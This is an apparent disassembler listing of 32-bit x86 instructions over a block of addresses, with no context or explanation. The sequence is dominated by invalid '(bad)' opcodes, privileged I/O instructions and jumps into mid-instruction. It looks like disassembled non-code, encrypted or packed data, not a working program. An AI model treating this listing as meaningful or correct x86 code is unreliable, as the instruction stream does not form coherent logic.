  40edc3:	xor    DWORD PTR [edi],esi
  40edc5:	aaa    
  40edc6:	aaa    
  40edc7:	stc    
  40edc8:	xchg   esi,eax
  40edc9:	mov    bh,0xbc
  40edcb:	in     eax,0x75
  40edcd:	pop    es
  40edce:	push   cs
  40edcf:	push   ds
  40edd0:	cmp    al,0xfc
  40edd2:	rol    BYTE PTR [ebx-0xf8621f1],1
  40edd8:	lock loope 0x40edd6
  40eddb:	sbb    esi,ebp
  40eddd:	cli    
  40edde:	inc    esp
  40eddf:	sbb    BYTE PTR [ebp-0x54],al
  40ede2:	scas   eax,DWORD PTR es:[edi]
  40ede3:	scas   al,BYTE PTR es:[edi]
  40ede4:	mov    dl,0xb2
  40ede6:	mov    dl,0x42
  40ede8:	mov    bh,0xdd
  40edea:	push   esi
  40edeb:	icebp  
  40edec:	or     cl,BYTE PTR [ecx+0x42]
  40edef:	mov    al,ds:0xd90d8251
  40edf4:	(bad)  
  40edf5:	or     ch,BYTE PTR [esi+0xc3bc061]
  40edfb:	ret    0xde5b
  40edfe:	mov    WORD PTR [ecx+0x74dcf5d3],es
  40ee04:	cmp    edi,DWORD PTR ds:0x573edd7a
  40ee0a:	scas   eax,DWORD PTR es:[edi]
  40ee0b:	lods   al,BYTE PTR ds:[esi]
  40ee0c:	and    al,BYTE PTR [eax+eiz*1+0x1bd40528]
  40ee13:	xor    eax,0x98262726
  40ee18:	call   0xf0ce:0xd7cee09a
  40ee1f:	pop    ss
  40ee20:	mov    edi,0xe37a816d
  40ee25:	and    ch,bl
  40ee27:	or     edi,0xc78f7ada
  40ee2d:	pop    esi
  40ee2e:	call   0x6df2e126
  40ee33:	sahf   
  40ee34:	cmp    DWORD PTR [edx-0x72],edi
  40ee37:	inc    edi
  40ee38:	mov    esi,0xd6ee9972
  40ee3d:	sbb    bh,BYTE PTR [ebp+0x75c424de]
  40ee43:	test   al,0x8f
  40ee45:	inc    ecx
  40ee46:	jne    0x40ee4a
  40ee48:	scas   eax,DWORD PTR es:[edi]
  40ee49:	mov    dl,0xf
  40ee4b:	scas   eax,DWORD PTR es:[edi]
  40ee4c:	out    dx,al
  40ee4d:	test   eax,0x1b519199
  40ee52:	ret    0x4475
  40ee55:	mov    ah,0xe1
  40ee57:	dec    esp
  40ee58:	mov    ds,WORD PTR [edx]
  40ee5a:	mov    ds:0x48d3d528,al
  40ee5f:	inc    eax
  40ee60:	inc    eax
  40ee61:	(bad)  
  40ee62:	mov    ebp,0x3d707998
  40ee67:	sahf   
  40ee68:	pop    ebp
  40ee69:	adc    eax,0x303a553
  40ee6e:	and    BYTE PTR [edx-0x78794e7],cl
  40ee74:	or     DWORD PTR [edi+0x373d4e24],0xf7dd48e6
  40ee7e:	std    
  40ee7f:	jle    0x40ee40
  40ee81:	jo     0x40eead
  40ee83:	xor    BYTE PTR [edi-0x2cbfd32e],ch
  40ee89:	jbe    0x40ee0e
  40ee8b:	add    BYTE PTR [esi+edx*2+0x17],al
  40ee8f:	push   edi
  40ee90:	cs cdq 
  40ee92:	push   esp
  40ee93:	add    ah,BYTE PTR [esi-0x3]
  40ee96:	rcl    DWORD PTR [eax+0x506c495],1
  40ee9c:	mov    eax,0xb7eb402e
  40eea1:	push   ss
  40eea2:	mov    ds:0xedb73dee,eax
  40eea7:	push   esi
  40eea8:	repnz cmp ecx,edi
  40eeab:	ins    BYTE PTR es:[edi],dx
  40eeac:	idiv   DWORD PTR [ebx+0x4579eeeb]
  40eeb2:	jmp    0x40ee9a
  40eeb4:	sbb    DWORD PTR [ebx+0x7a7a6020],eax
  40eeba:	call   0x868d:0x1a45c5c5
  40eec1:	int    0x23
  40eec3:	push   0xddbb7f20
  40eec8:	out    0xc2,al
  40eeca:	test   DWORD PTR [ebx],ecx
  40eecc:	je     0x40ef08
  40eece:	sbb    eax,0x76602082
  40eed3:	jbe    0x40ef2b
  40eed5:	and    eax,0x19b274d1
  40eeda:	lds    esi,FWORD PTR [ecx-0x34]
  40eedd:	cli    
  40eede:	cli    
  40eedf:	cmp    dl,BYTE PTR [edi+0x6b625d2e]
  40eee5:	imul   ecx,DWORD PTR [ebx],0xffffffcf
  40eee8:	repz fcomp st(2)
  40eeeb:	fcmovu st,st(2)
  40eeed:	inc    eax
  40eeee:	xchg   ebp,eax
  40eeef:	pop    ss
  40eef0:	xor    eax,0x9b23cea3
  40eef5:	(bad)
  40eef9:	mov    edi,0xcf6797df
  40eefe:	sahf   
  40eeff:	pop    ebp
  40ef00:	cmp    edi,DWORD PTR [ebx-0xa]
  40ef03:	in     al,dx
  40ef04:	pop    ds
  40ef05:	add    cl,BYTE PTR [ecx+0x10]
  40ef08:	add    al,0xd5
  40ef0a:	(bad)
  40ef0d:	cdq    
  40ef0e:	xchg   DWORD PTR [esi],ebx
  40ef10:	jp     0x40eefa
  40ef12:	into   
  40ef13:	cdq    
  40ef14:	cdq    
  40ef15:	cdq    
  40ef16:	mov    ebx,0x87e1e5be
  40ef1b:	out    dx,eax
  40ef1c:	mov    ebx,0x1f3bcee3
  40ef21:	sbb    BYTE PTR [edi],bl
  40ef23:	sbb    ebx,DWORD PTR [ebx]
  40ef25:	sbb    eax,DWORD PTR [esi-0x4e4a405f]
  40ef2b:	sar    edx,0xda
  40ef2e:	sbb    ch,ch
  40ef30:	push   esi
  40ef31:	dec    ebx
  40ef32:	sbb    DWORD PTR [edx],ebx
  40ef34:	jnp    0x40eef3
  40ef36:	or     al,0xfa
  40ef38:	xor    cl,BYTE PTR [eax]
  40ef3a:	out    dx,al
  40ef3b:	jbe    0x40ef55
  40ef3d:	dec    ecx
  40ef3e:	scas   eax,DWORD PTR es:[edi]
  40ef3f:	xlat   BYTE PTR ds:[ebx]
  40ef40:	or     al,0x72
  40ef42:	adc    DWORD PTR [esi+0x278b9167],ebx
  40ef48:	cmp    al,0x86
  40ef4a:	std    
  40ef4b:	nop
  40ef4c:	stos   DWORD PTR es:[edi],eax
  40ef4d:	ret    
  40ef4e:	jne    0x40eefe
  40ef50:	scas   al,BYTE PTR es:[edi]
  40ef51:	outs   dx,BYTE PTR ds:[esi]
  40ef52:	jo     0x40ef36
  40ef54:	in     al,0x59
  40ef56:	sub    dl,BYTE PTR [ebp-0x72a54af6]
  40ef5c:	icebp  
  40ef5d:	icebp  
  40ef5e:	xor    DWORD PTR [esi],edx
  40ef60:	test   dh,0xf3
  40ef63:	out    dx,al
  40ef64:	xlat   BYTE PTR ds:[ebx]
  40ef65:	dec    edi
  40ef66:	repz fucomp st(7)
  40ef69:	pop    edx
  40ef6a:	and    al,0xe6
  40ef6c:	xor    bl,bl
  40ef6e:	lods   eax,DWORD PTR ds:[esi]
  40ef6f:	test   BYTE PTR [ebx+0x6b],cl
  40ef72:	sub    eax,0xc7a4fcbe
  40ef77:	jae    0x40efc8
  40ef79:	mov    ebp,0x163f1fc8
  40ef7e:	jae    0x40eff5
  40ef80:	stc    
  40ef81:	adc    eax,0x447b3636
  40ef86:	popf   
  40ef87:	xor    DWORD PTR [eax],ebp
  40ef89:	aad    0x55
  40ef8b:	test   al,0x73
  40ef8d:	cmc    
  40ef8e:	and    BYTE PTR [edi+ecx*1-0x7d],dl
  40ef92:	out    dx,eax
  40ef93:	jecxz  0x40ef5e
  40ef95:	xor    ebp,DWORD PTR [eax+0xc8b4]
  40ef9b:	and    BYTE PTR [eax],al
  40ef9d:	dec    ecx
  40ef9e:	inc    esp
  40ef9f:	inc    ecx
  40efa0:	push   esp
  40efa1:	push   cs
  40efa2:	and    bl,dl
  40efa4:	test   BYTE PTR [eax+0xb],bh
  40efa7:	adc    DWORD PTR [ebp+0x23],ebp
  40efaa:	jecxz  0x40ef62
  40efac:	sahf   
  40efad:	sbb    al,0xa5
  40efaf:	cdq    
  40efb0:	xor    al,0xb4
  40efb3:	(bad)  
  40efb4:	rol    BYTE PTR [ecx+0x53],0x40
  40efb8:	xchg   BYTE PTR [ecx],dh
  40efba:	or     BYTE PTR [ecx],al
  40efbc:	push   edx
  40efbd:	xor    eax,DWORD PTR [esi-0x500839dc]
  40efc3:	lods   eax,DWORD PTR ds:[esi]
  40efc4:	outs   dx,BYTE PTR ds:[esi]
  40efc5:	cli    
  40efc6:	mov    esi,0x25dbb74f
  40efcb:	mov    fs,WORD PTR [ebx-0x75]
  40efce:	push   es
  40efcf:	aad    0x65
  40efd1:	add    al,0xc0
  40efd3:	in     eax,0x5b
  40efd5:	(bad)  
  40efd6:	leave  
  40efd7:	aaa    
  40efd8:	shr    BYTE PTR [esi+0x2a],1
  40efdb:	and    DWORD PTR [eax-0x37750b6f],ecx
  40efe1:	dec    ebp
  40efe2:	add    al,BYTE PTR [ebx+edx*4+0x25]
  40efe6:	and    eax,0x5a67e51b
  40efeb:	mov    esi,0x2b91400e
  40eff0:	out    dx,eax
  40eff1:	pop    edx
  40eff2:	test   BYTE PTR [esp+eax*4+0x1a],bl
  40eff6:	jbe    0x40f06a
  40eff8:	add    DWORD PTR [esi],edx
  40effa:	in     eax,dx
  40effb:	iret   
  40effc:	aas    
  40effd:	dec    edi
  40effe:	adc    DWORD PTR [ecx],edx
  40f000:	sbb    dh,ah
  40f002:	push   ebx
  40f003:	scas   eax,DWORD PTR es:[edi]
  40f004:	xlat   BYTE PTR ds:[ebx]
  40f005:	cdq    
  40f006:	cwde   
  40f007:	cwde   
  40f008:	pusha  
  40f009:	pop    edx
  40f00a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f00b:	(bad)  
  40f00c:	xor    bh,bl
  40f00e:	inc    eax
  40f00f:	mov    ecx,0xb6b6b701
  40f014:	fcomp  st(0)
  40f016:	fsub   DWORD PTR [eax-0x54ae1429]
  40f01c:	aad    0x58
  40f01e:	pop    esp
  40f01f:	pop    esp
  40f020:	fs jl  0x40f09f
  40f023:	fcomp  QWORD PTR [edx]
  40f025:	jmp    0x40f009
  40f027:	cmp    BYTE PTR [esi-0x4e4d1225],ah
  40f02d:	mov    cl,0xc1
  40f02f:	xchg   ebp,eax
  40f030:	sub    edx,DWORD PTR [edi+0x68]
  40f033:	mov    bh,0xdb
  40f035:	lods   al,BYTE PTR ds:[esi]
  40f036:	scas   eax,DWORD PTR es:[edi]
  40f037:	scas   eax,DWORD PTR es:[edi]
  40f038:	pop    edi
  40f039:	pop    ecx
  40f03a:	pop    esi
  40f03b:	pop    esi
  40f03c:	jle    0x40f028
  40f03e:	aam    0xa9
  40f040:	push   ebx
  40f041:	pop    edi
  40f042:	jle    0x40f035
  40f044:	lds    edx,FWORD PTR [edi]
  40f046:	lahf   
  40f047:	inc    eax
  40f048:	and    DWORD PTR [eax],eax
  40f04a:	sti    
  40f04b:	push   0xab485fb9
  40f050:	ins    BYTE PTR es:[edi],dx
  40f051:	add    al,0x40
  40f053:	sbb    DWORD PTR [eax-0x79e6ebaf],edx
  40f059:	mov    al,0x2
  40f05b:	jl     0x40f04e
  40f05d:	out    0x7f,eax
  40f05f:	(bad)  
  40f060:	out    0xab,eax
  40f062:	rcl    ebx,cl
  40f064:	rcl    DWORD PTR [ebx-0x1f07c1f1],cl
  40f06a:	and    DWORD PTR [ebp+0xfbba5a5],0x687c3e1f
  40f074:	ins    BYTE PTR es:[edi],dx
  40f075:	ins    BYTE PTR es:[edi],dx
  40f076:	ins    BYTE PTR es:[edi],dx
  40f077:	jbe    0x40f0da
  40f079:	jle    0x40f0f9
  40f07b:	sub    ch,BYTE PTR [eax]
  40f07d:	xchg   ebp,eax
  40f07e:	retfw  0x3041
  40f082:	jecxz  0x40f0fd
  40f084:	pop    esi
  40f085:	xor    BYTE PTR [esi+ecx*1],bl
  40f088:	imul   ebx,DWORD PTR [ecx],0x84a8025b
  40f08e:	sub    BYTE PTR [ecx-0x7c],dl
  40f091:	lock cmp al,0x3b
  40f094:	daa    
  40f095:	loope  0x40f06c
  40f097:	pusha  
  40f098:	or     dh,BYTE PTR [esi-0x64]
  40f09b:	loopne 0x40f0bd
  40f09d:	addr16 inc edi
  40f09f:	pop    eax
  40f0a0:	js     0x40f060
  40f0a2:	dec    edi
  40f0a3:	sbb    al,0x45
  40f0a5:	mov    ah,0xdb
  40f0a7:	ins    DWORD PTR es:[edi],dx
  40f0a8:	(bad)  
  40f0aa:	ss xchg edi,eax
  40f0ac:	cs pop ebp
  40f0ae:	(bad)  
  40f0af:	and    DWORD PTR [ebp+0x6cd9a25],esi
  40f0b5:	mov    bl,0xf3
  40f0b7:	xor    ecx,DWORD PTR [edi+ecx*4+0x6f5df18d]
  40f0be:	das    
  40f0bf:	repz xchg ecx,eax
  40f0c1:	neg    ebp
  40f0c3:	inc    ebp
  40f0c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0c5:	pop    edi
  40f0c6:	inc    ebx
  40f0c7:	and    al,0x9
  40f0c9:	(bad)  
  40f0ca:	sbb    eax,0x89f6790b
  40f0cf:	stos   DWORD PTR es:[edi],eax
  40f0d0:	pop    esp
  40f0d1:	pop    esi
  40f0d2:	pop    ebp
  40f0d3:	out    0xdc,eax
  40f0d5:	dec    edx
  40f0d6:	enter  0xcaca,0xcb
  40f0da:	pushf  
  40f0db:	mov    esi,0xc41c24d4
  40f0e0:	stos   BYTE PTR es:[edi],al
  40f0e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0e2:	inc    ecx
  40f0e3:	mov    edi,0xa879a504
  40f0e8:	in     al,dx
  40f0e9:	push   edi
  40f0ea:	fiadd  WORD PTR [esi-0x27]
  40f0ed:	and    DWORD PTR [edi+ecx*1-0x48eee0b7],0xffffff91
  40f0f5:	jb     0x40f09f
  40f0f7:	and    bl,BYTE PTR [ebx+eiz*8]
  40f0fa:	or     cl,BYTE PTR ds:[ecx+ecx*2+0x74e2f654]
  40f102:	push   ds
  40f103:	test   BYTE PTR [ecx+0x34844050],cl
  40f109:	push   0xffffffa1
  40f10b:	push   ss
  40f10c:	mov    ch,al
  40f10e:	push   ecx
  40f10f:	stos   BYTE PTR es:[edi],al
  40f110:	es inc ch
  40f113:	ins    DWORD PTR es:[edi],dx
  40f114:	cli    
  40f115:	mov    eax,0xa8bdff3e
  40f11a:	add    BYTE PTR [esi-0x2271c0db],ch
  40f120:	fidiv  DWORD PTR [ecx-0x52]
  40f123:	cmc    
  40f124:	xor    ecx,ecx
  40f126:	dec    esp
  40f127:	test   DWORD PTR [ebp+0x7e4ec8e3],0x37fd2570
  40f131:	push   edx
  40f132:	add    eax,0x799b7af8
  40f137:	push   ds
  40f138:	iret   
  40f139:	repz cwde 
  40f13b:	cwde   
  40f13c:	cwde   
  40f13d:	pusha  
  40f13e:	outs   dx,BYTE PTR ds:[esi]
  40f13f:	outs   dx,BYTE PTR ds:[esi]
  40f140:	mov    cs,ecx
  40f142:	leave  
  40f143:	dec    ecx
  40f144:	and    BYTE PTR [eax],0xc8
  40f147:	and    BYTE PTR [edx-0x2a3a54aa],bl
  40f14d:	stos   DWORD PTR es:[edi],eax
  40f14e:	push   edi
  40f14f:	pop    ecx
  40f150:	pop    ebx
  40f151:	pop    ebx
  40f152:	inc    ebx
  40f153:	dec    edx
  40f154:	leave  
  40f155:	aam    0xd4
  40f157:	adc    al,0x8b
  40f159:	mov    ecx,DWORD PTR [ebx-0x732a54ac]
  40f15f:	xchg   ecx,eax
  40f160:	jo     0x40f1cf
  40f162:	ins    DWORD PTR es:[edi],dx
  40f163:	lea    ecx,[ebx]
  40f165:	pop    ss
  40f166:	cs mov al,0xba
  40f169:	mov    edx,0x643870ca
  40f16e:	jnp    0x40f1eb
  40f170:	sti    
  40f171:	loop   0x40f124
  40f173:	arpl   di,ax
  40f175:	(bad)  
  40f176:	loopne 0x40f151
  40f178:	addr16 lahf 
  40f17a:	std    
  40f17b:	jecxz  0x40f14a
  40f17d:	int    0xcd
  40f17f:	push   ebp
  40f180:	aam    0xb8
  40f182:	xor    DWORD PTR [ecx],edi
  40f184:	mov    ch,0x61
  40f186:	xchg   esp,eax
  40f187:	clc    
  40f188:	mov    ebx,DWORD PTR [eax+0x7dd67481]
  40f18e:	jge    0x40f20e
  40f190:	cmp    eax,0x75649249
  40f195:	jne    0x40f14c
  40f197:	cmc    
  40f198:	fxch   st(7)
  40f19a:	jle    0x40f192
  40f19c:	pop    ecx
  40f19d:	loopne 0x40f1e8
  40f19f:	jge    0x40f16e
  40f1a1:	jb     0x40f148
  40f1a3:	push   edx
  40f1a4:	or     DWORD PTR [edx],ebp
  40f1a6:	xchg   ebp,eax
  40f1a7:	dec    edx
  40f1a8:	stc    
  40f1a9:	cmc    
  40f1aa:	scas   eax,DWORD PTR es:[edi]
  40f1ab:	jg     0x40f1aa
  40f1ad:	rcr    BYTE PTR [ebp-0x7862189],cl
  40f1b3:	rol    BYTE PTR [ecx-0x64288fd],0xcd
  40f1ba:	outs   dx,DWORD PTR ds:[esi]
  40f1bb:	jle    0x40f22d
  40f1bd:	iret   
  40f1be:	sahf   
  40f1bf:	cmp    eax,0x468d1afb
  40f1c4:	mov    ch,0xb5
  40f1c6:	mov    ch,0xc5
  40f1c8:	aad    0xab
  40f1ca:	push   edi
  40f1cb:	(bad)  
  40f1cd:	fsub   DWORD PTR [eax+0x7b]
  40f1d0:	jnp    0x40f22d
  40f1d2:	int    0x85
  40f1d4:	shl    BYTE PTR [ecx],1
  40f1d6:	stos   BYTE PTR es:[edi],al
  40f1d7:	stc    
  40f1d8:	call   0xbdce:0x3e90df8a
  40f1df:	ins    BYTE PTR es:[edi],dx
  40f1e0:	out    0xca,al
  40f1e2:	scas   al,BYTE PTR es:[edi]
  40f1e3:	add    al,cl
  40f1e5:	popf   
  40f1e6:	adc    DWORD PTR [edx+ebp*1-0x62d7ae56],0xffffffdb
  40f1ee:	and    BYTE PTR [ebx-0x4e4de3d0],ch
  40f1f4:	ds pusha 
  40f1f6:	ins    DWORD PTR es:[edi],dx
  40f1f7:	jge    0x40f256
  40f1f9:	cmp    eax,0x95b236b3
  40f1fe:	retf   0x413e
  40f201:	push   eax
  40f202:	bound  esi,QWORD PTR [ecx-0x46]
  40f205:	leave  
  40f206:	inc    ebx
  40f207:	pop    ds
  40f208:	cdq    
  40f209:	daa    
  40f20a:	test   al,0x1c
  40f20c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f20d:	push   esp
  40f20e:	outs   dx,BYTE PTR ds:[esi]
  40f20f:	push   edx
  40f210:	cs xchg ebp,eax
  40f212:	mov    DWORD PTR [ebp-0x40],esp
  40f215:	pusha  
  40f216:	xor    al,ah
  40f218:	jae    0x40f279
  40f21a:	mov    edi,DWORD PTR [ecx-0x12]
  40f21d:	icebp  
  40f21e:	xchg   ebx,eax
  40f21f:	cmp    al,0x72
  40f221:	adc    al,0x5e
  40f223:	jns    0x40f206
  40f225:	sub    bl,BYTE PTR [ebx-0x62db5415]
  40f22b:	xor    eax,esi
  40f22d:	retf   
  40f22e:	rcr    al,1
  40f230:	add    esi,ebp
  40f232:	ret    
  40f233:	mov    BYTE PTR [eax+0x2a4af082],ah
  40f239:	mov    esp,0xd10ab879
  40f23e:	push   ss
  40f23f:	inc    esp
  40f240:	sbb    ecx,eax
  40f242:	jo     0x40f257
  40f244:	push   eax
  40f245:	icebp  
  40f246:	or     ah,BYTE PTR [eax+0x1b56e012]
  40f24c:	xchg   edx,eax
  40f24d:	sti    
  40f24e:	out    dx,al
  40f24f:	imul   esi,DWORD PTR [eax],0xe4818a74
  40f255:	mov    ebp,0x5befbe56
  40f25a:	xor    al,0x6
  40f25c:	sbb    ecx,esp
  40f25e:	shl    esi,cl
  40f260:	push   ebp
  40f261:	retf   0x6003
  40f264:	fisubr DWORD PTR [esi+0x25aa00bd]
  40f26a:	call   0xb097:0x145555d8
  40f271:	pop    ebp
  40f272:	add    cl,BYTE PTR [edi-0x6e]
  40f275:	cwde   
  40f276:	cmp    dh,cl
  40f278:	xor    al,BYTE PTR [eax]
  40f27a:	xlat   BYTE PTR ds:[ebx]
  40f27b:	push   es
  40f27c:	lock cmc 
  40f27e:	stos   BYTE PTR es:[edi],al
  40f27f:	add    BYTE PTR [edi],dh
  40f281:	loop   0x40f2b8
  40f283:	sub    BYTE PTR [edx-0x9912662],bh
  40f289:	aad    0x6a
  40f28b:	xor    eax,0x9fdfeff6
  40f290:	sub    edi,0xd7af5f66
  40f296:	jecxz  0x40f294
  40f298:	stc    
  40f299:	rep lods al,BYTE PTR ds:[esi]
  40f29b:	scas   al,BYTE PTR es:[edi]
  40f29c:	scas   al,BYTE PTR es:[edi]
  40f29d:	xchg   edx,eax
  40f29e:	and    al,0x9
  40f2a0:	rcl    ebx,cl
  40f2a2:	shr    DWORD PTR [ebp*1+0x56ad512d],cl
  40f2a9:	xor    esi,edi
  40f2ab:	outs   dx,BYTE PTR ds:[esi]
  40f2ac:	mov    ch,0x5a
  40f2ae:	pushf  
  40f2af:	cmp    eax,0xe5e5967b
  40f2b4:	gs loop 0x40f2ef
  40f2b7:	es or  al,0xc3
  40f2ba:	rcl    DWORD PTR [ebx+0x4f],0x3d
  40f2be:	cmc    
  40f2bf:	imul   ecx,edi,0x3d
  40f2c2:	neg    esp
  40f2c4:	pop    ds
  40f2c5:	ins    DWORD PTR es:[edi],dx
  40f2c6:	ins    BYTE PTR es:[edi],dx
  40f2c7:	ins    BYTE PTR es:[edi],dx
  40f2c8:	lods   al,BYTE PTR ds:[esi]
  40f2c9:	mov    eax,ds:0xa129b8a4
  40f2ce:	jmp    0x40f2e2
  40f2d0:	mov    ecx,0xdbafceb8
  40f2d5:	not    edx
  40f2d7:	stc    
  40f2d8:	push   ebx
  40f2d9:	dec    edx
  40f2da:	lods   al,BYTE PTR ds:[esi]
  40f2db:	bound  ecx,QWORD PTR [eax]
  40f2dd:	gs mov ebp,0xc18012d
  40f2e3:	push   es
  40f2e4:	leave  
  40f2e5:	pusha  
  40f2e6:	xor    al,ch
  40f2e8:	cmp    eax,0xc723c8f2
  40f2ed:	push   ds
  40f2ee:	jns    0x40f2d4
  40f2f0:	xchg   ecx,eax
  40f2f1:	add    DWORD PTR [bx+di-0x51],edx
  40f2f5:	xlat   BYTE PTR ds:[ebx]
  40f2f6:	(bad)  
  40f2f7:	out    dx,al
  40f2f8:	cmp    al,0x7c
  40f2fa:	js     0x40f2f2
  40f2fc:	fwait
  40f2fd:	out    dx,eax
  40f2fe:	mov    edi,0x47239eff
  40f303:	mov    ds,esp
  40f305:	sti    
  40f306:	lock ret 
  40f308:	(bad)  
  40f30a:	jo     0x40f370
  40f30c:	popa   
  40f30d:	loope  0x40f2ef
  40f30f:	clc    
  40f310:	clc    
  40f311:	js     0x40f2d0
  40f313:	shr    DWORD PTR [esi-0x4d],cl
  40f316:	jp     0x40f30d
  40f318:	sub    bl,BYTE PTR [ebp-0x4a0a78b2]
  40f31e:	xor    eax,0x4daedd7a
  40f323:	pop    edi
  40f324:	in     eax,dx
  40f325:	(bad)  
  40f326:	push   esp
  40f327:	xor    al,0x7d
  40f329:	mov    bh,0xdb
  40f32b:	xchg   esi,eax
  40f32c:	daa    
  40f32d:	js     0x40f2b3
  40f32f:	jno    0x40f304
  40f331:	adc    eax,0x526a2bec
  40f336:	fisubr DWORD PTR [ecx+0x7b8516a5]
  40f33c:	sahf   
  40f33d:	rcr    BYTE PTR [edi-0x6a5b667c],cl
  40f343:	nop
  40f344:	hlt    
  40f345:	adc    eax,DWORD PTR [esi]
  40f347:	test   BYTE PTR [ebx+ebx*8+0x5797965d],dh
  40f34e:	push   esp
  40f34f:	lods   al,BYTE PTR ds:[esi]
  40f350:	inc    edx
  40f351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f352:	inc    esp
  40f353:	mov    ds:0x4a7a60d1,eax
  40f358:	fldenv [ebp+0x3e]
  40f35b:	lock xchg esi,eax
  40f35d:	dec    ecx
  40f35e:	ds (bad) 
  40f360:	pop    ss
  40f361:	mov    esi,0x625c7e99
  40f366:	rcl    BYTE PTR [ebx-0x6f1a1284],1
  40f36c:	scas   eax,DWORD PTR es:[edi]
  40f36d:	dec    cl
  40f36f:	sbb    ch,BYTE PTR [ebx]
  40f371:	sub    esp,DWORD PTR [edi-0x49503c08]
  40f377:	mov    eax,0xed18f27a
  40f37c:	mov    ch,0x6
  40f37e:	jb     0x40f328
  40f380:	sbb    edx,eax
  40f382:	fdivr  DWORD PTR [esp+edx*8]
  40f385:	punpcklwd mm6,DWORD PTR [edx]
  40f388:	and    DWORD PTR [ebx-0x2f],edi
  40f38b:	cmp    al,BYTE PTR [ebx+ebx*4+0x10]
  40f38f:	scas   al,BYTE PTR es:[edi]
  40f390:	shl    BYTE PTR [eax-0x7d],0x5a
  40f394:	lods   eax,DWORD PTR ds:[esi]
  40f395:	ret    
  40f396:	loop   0x40f35a
  40f398:	sbb    bl,al
  40f39a:	mov    al,0xef
  40f39c:	cmp    al,0xee
  40f39e:	sub    dl,dh
  40f3a0:	ins    BYTE PTR es:[edi],dx
  40f3a1:	mov    bh,0xdb
  40f3a3:	inc    ebp
  40f3a4:	mov    WORD PTR [ebp+0x1b],?
  40f3a7:	aaa    
  40f3a8:	icebp  
  40f3a9:	loopne 0x40f356
  40f3ab:	shl    BYTE PTR [esi+0x65],1
  40f3ae:	add    al,0x4
  40f3b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3b1:	test   DWORD PTR [edi],0x8d1a0306
  40f3b7:	xchg   BYTE PTR [esi-0x1ffba603],al
  40f3bd:	sbb    bh,dh
  40f3bf:	fsub   st(7),st
  40f3c1:	imul   ebp,DWORD PTR [edx],0xf54516a1
  40f3c7:	in     eax,0xdb
  40f3c9:	lea    ebp,[edx+0x4c7a3700]
  40f3cf:	fidiv  WORD PTR [eax]
  40f3d1:	push   0xd9b37e24
  40f3d6:	mov    ah,0x7a
  40f3d8:	mov    ebx,0xfecccdd1
  40f3dd:	dec    esi
  40f3de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3df:	ret    
  40f3e0:	retf   0x8aca
  40f3e3:	and    eax,0x49c9c9fc
  40f3e8:	push   ss
  40f3e9:	push   ss
  40f3ea:	push   ss
  40f3eb:	sbb    BYTE PTR [ebx],bl
  40f3ed:	sbb    ecx,ebx
  40f3ef:	and    al,0x79
  40f3f1:	fcomp  st(6)
  40f3f3:	fsubrp st(6),st
  40f3f5:	fdivr  QWORD PTR [ecx+0x7cbe5c73]
  40f3fb:	cdq    
  40f3fc:	dec    esi
  40f3fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3fe:	ret    
  40f3ff:	div    dh
  40f401:	div    dh
  40f403:	repnz repnz repnz push edi
  40f407:	mov    ds,WORD PTR [edi]
  40f409:	aas    
  40f40a:	(bad)  
  40f40b:	fnstenv [ebx]
  40f40d:	addr16 into 
  40f40f:	mov    esp,0xa6d02284
  40f414:	mov    ecx,0x9042053d
  40f419:	sub    al,0xd1
  40f41b:	jecxz  0x40f439
  40f41d:	fwait
  40f41e:	dec    ebp
  40f420:	xor    eax,DWORD PTR [edx+0x36a37efc]
  40f426:	call   0x28455ac5
  40f42b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f42c:	and    edi,DWORD PTR [ebx-0xb8b9123]
  40f432:	stc    
  40f433:	out    0x2f,eax
  40f435:	sbb    al,0x7d
  40f437:	(bad)  
  40f438:	stc    
  40f439:	push   ebx
  40f43a:	shl    BYTE PTR [edi+0x6a],0xb5
  40f43e:	pop    edx
  40f43f:	jae    0x40f4af
  40f441:	outs   dx,BYTE PTR ds:[esi]
  40f442:	outs   dx,BYTE PTR ds:[esi]
  40f443:	cli    
  40f444:	mov    eax,ds:0x783a1e87
  40f449:	(bad)  
  40f44a:	std    
  40f44b:	idiv   DWORD PTR [edi]
  40f44d:	hlt    
  40f44e:	out    0xdf,eax
  40f450:	hlt    
  40f451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f452:	xlat   BYTE PTR ds:[ebx]
  40f453:	in     al,dx
  40f454:	fnsave [edi+0x7743ceef]
  40f45a:	fcom   QWORD PTR [ecx-0x69]
  40f45d:	push   eax
  40f45e:	sbb    DWORD PTR [ebx+edi*4-0xc],esi
  40f462:	pop    es
  40f463:	add    esp,DWORD PTR [ebp-0x45]
  40f466:	fcomp  st(0)
  40f468:	mov    al,0xf6
  40f46a:	getsec 
  40f46c:	aam    0x39
  40f46e:	lods   eax,DWORD PTR ds:[esi]
  40f46f:	(bad)  
  40f471:	add    ecx,DWORD PTR [ecx+eax*2+0xf9d231b]
  40f478:	mov    eax,ds:0x10da74dd
  40f47d:	and    ah,BYTE PTR ds:0x9a8a44d2
  40f483:	ins    DWORD PTR es:[edi],dx
  40f484:	out    0x1c,al
  40f486:	int    0x30
  40f488:	pop    esp
  40f489:	adc    DWORD PTR [ecx+0x178db6bf],0x410bf774
  40f493:	adc    al,0x25
  40f495:	ins    BYTE PTR es:[edi],dx
  40f496:	ins    DWORD PTR es:[edi],dx
  40f497:	outs   dx,BYTE PTR ds:[esi]
  40f498:	mov    bl,0xb9
  40f49a:	mov    cl,0x5
  40f49c:	inc    edx
  40f49d:	jo     0x40f4db
  40f49f:	or     BYTE PTR [eax-0x7073346c],ch
  40f4a5:	xor    eax,0xf38c4e68
  40f4aa:	out    0x96,eax
  40f4ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4ad:	jns    0x40f4a6
  40f4af:	fistp  WORD PTR [ecx+0x76c2de04]
  40f4b5:	dec    edi
  40f4b6:	mov    al,0xba
  40f4b8:	fsubrp st(5),st
  40f4ba:	idiv   DWORD PTR [edi-0x198a4e16]
  40f4c0:	sub    al,0xbf
  40f4c2:	call   FWORD PTR [eax-0x75]
  40f4c5:	push   edi
  40f4c6:	sahf   
